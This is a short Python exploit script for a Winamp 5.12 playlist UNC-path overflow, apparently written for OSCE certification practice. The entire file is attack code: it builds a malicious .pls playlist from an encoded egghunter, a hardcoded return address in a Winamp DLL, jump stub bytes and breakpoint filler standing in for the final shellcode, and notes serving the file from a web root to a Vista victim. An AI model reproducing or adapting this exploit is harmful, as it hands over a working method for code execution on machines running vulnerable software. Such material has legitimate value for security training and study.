#!/usr/bin/python
# Winamp 5.12 Playlist UNC Path Computer Name Overflow Python Exploit
#coded in python due to loathing of perl but necessity of use of this exploit for osce
start = "[playlist]\r\nFile1=\\\\"
nop = "T00WT00W" + "\xcc" * 848
#nops
#// 32 byte egghunt shellcode (egg=0x57303054)
#egghunter shellcode is


buf =  ""
buf += "\xda\xd4\xd9\x74\x24\xf4\x58\x50\x59\x49\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37"
buf += "\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
buf += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
buf += "\x50\x38\x41\x42\x75\x4a\x49\x45\x36\x4e\x61\x58\x4a"
buf += "\x39\x6f\x74\x4f\x77\x32\x66\x32\x33\x5a\x57\x72\x53"
buf += "\x68\x6a\x6d\x34\x6e\x75\x6c\x45\x55\x71\x4a\x73\x44"
buf += "\x4a\x4f\x4c\x78\x62\x74\x46\x50\x44\x70\x33\x67\x6c"
buf += "\x4b\x39\x6a\x6c\x6f\x50\x75\x5a\x4a\x6c\x6f\x54\x35"
buf += "\x59\x77\x39\x6f\x78\x67\x41\x41"

egghunter = buf
#previous egghunter
#egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

#"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
shellcode = "\xcc" * 41
#breakpoints
#0202D961 -address of first call esp function in in_mp3 dll in the program
#this is added in to redirect execution

#0011FBD8   83EC 58          SUB ESP,58
#0011FBDB   83EC 58          SUB ESP,58
#0011FBDE   FFE4             JMP ESP
#first stage shellcode

jmp = "\x61\xd9\x02\x02" + "\x83\xec\x58\x83\xec\x58\xff\xe4" + "\x90\x90\x90\x90"
#41's for overwriting eip
end = "\r\nTitle1=pwnd\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n"


payload = start + nop + egghunter + shellcode + jmp + end
poc = open('poc.pls', 'w')
poc.write(payload)
poc.close()
#you copy this generated poc.pls file into the apache web root, then download it onto the vista box
